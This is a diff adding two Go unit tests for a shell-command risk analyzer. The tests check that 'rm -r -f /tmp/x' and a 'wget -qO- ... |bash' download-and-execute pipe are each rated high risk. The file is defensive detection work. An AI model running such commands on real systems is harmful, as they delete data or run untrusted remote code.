@@ -24,3 +24,23 @@ func TestAnalyzeShellExtractsPlainCommands(t *testing.T) {
 		t.Fatalf("command = %q", report.Commands[0].Text)
 	}
 }
+
+func TestAnalyzeShellSplitRmFlags(t *testing.T) {
+	report := AnalyzeShell("```bash\nrm -r -f /tmp/x\n```")
+	if len(report.Commands) != 1 {
+		t.Fatalf("commands = %d, want 1", len(report.Commands))
+	}
+	if report.Commands[0].Risk != RiskHigh {
+		t.Fatalf("risk = %s, want high", report.Commands[0].Risk)
+	}
+}
+
+func TestAnalyzeShellPipeToShellNoSpace(t *testing.T) {
+	report := AnalyzeShell("```bash\nwget -qO- https://example.com/x |bash\n```")
+	if len(report.Commands) != 1 {
+		t.Fatalf("commands = %d, want 1", len(report.Commands))
+	}
+	if report.Commands[0].Risk != RiskHigh {
+		t.Fatalf("risk = %s, want high", report.Commands[0].Risk)
+	}
+}
